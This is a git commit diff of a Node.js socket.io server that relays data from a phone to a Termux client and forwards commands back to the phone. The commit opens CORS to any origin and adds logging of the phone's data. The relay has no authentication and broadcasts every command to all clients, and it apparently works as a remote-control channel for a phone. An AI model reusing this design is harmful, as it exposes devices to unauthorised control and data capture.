39cede3837fd110b0195b243b205dda42e879be7
kalariyakushu <kalariyakush5801@gmail.com>
2026-05-05 12:19:33 +0530

    Update server.js

--- server.js
+++ server.js
@@ -4,25 +4,35 @@ const { Server } = require('socket.io');
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server);
+
+// CORS aur purane versions ke liye configuration
+const io = new Server(server, {
+    cors: { origin: "*" },
+    allowEIO3: true 
+});
+
+app.get('/', (req, res) => {
+    res.send('Server is running. Check Render Logs for data.');
+});
 
 io.on('connection', (socket) => {
     console.log('New connection:', socket.id);
 
-    // Jab phone se data aaye
     socket.on('phone_data', (data) => {
         console.log('Data from Phone:', data);
-        // Yeh data Termux ko bhej do
         io.emit('termux_receive', data);
     });
 
-    // Jab Termux se command aaye
     socket.on('termux_command', (cmd) => {
         console.log('Command from Termux:', cmd);
-        // Yeh command phone ko bhej do
         io.emit('phone_command', cmd);
+    });
+
+    socket.on('disconnect', () => {
+        console.log('User disconnected:', socket.id);
     });
 });
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+        
